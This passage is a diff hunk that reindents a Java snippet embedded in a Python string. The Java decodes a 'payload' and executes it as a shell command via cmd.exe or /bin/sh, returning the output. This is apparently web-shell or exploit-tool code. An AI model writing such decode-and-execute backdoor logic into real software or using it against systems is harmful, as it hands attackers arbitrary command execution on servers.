@@ -7,14 +7,14 @@ code = """
         payload = new String(decoder(payload));
         Process process;
         boolean iswin = System.getProperty("os.name").toLowerCase()
-                .startsWith("windows");
+            .startsWith("windows");
         if (iswin) {
             process = Runtime.getRuntime().exec(
-                    new String[] {"cmd.exe", "/c", payload}
+                new String[] {"cmd.exe", "/c", payload}
             );
         } else {
             process = Runtime.getRuntime().exec(
-                    new String[] {"/bin/sh", "-c", payload}
+                new String[] {"/bin/sh", "-c", payload}
             );
         }
         Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\\\A");
